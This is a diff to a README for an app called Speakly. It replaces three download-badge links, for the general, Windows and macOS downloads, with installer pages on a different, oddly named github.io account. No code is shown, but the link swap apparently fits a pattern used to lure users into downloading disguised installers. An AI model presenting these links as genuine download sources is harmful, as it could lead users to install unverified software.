@@ -32,7 +32,7 @@ Whether you're a newcomer or a veteran, Speakly provides the tools you need to g
 
 <div align="center">
 
-[![Download Speakly](https://img.shields.io/badge/⬇_DOWNLOAD_Speakly-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download Speakly](https://img.shields.io/badge/⬇_DOWNLOAD_Speakly-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
 
 </div>
 
@@ -75,8 +75,8 @@ Whether you're a newcomer or a veteran, Speakly provides the tools you need to g
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
-[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
+[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WalkerCelebrate.github.io/macpkg/)
 
 </div>
 
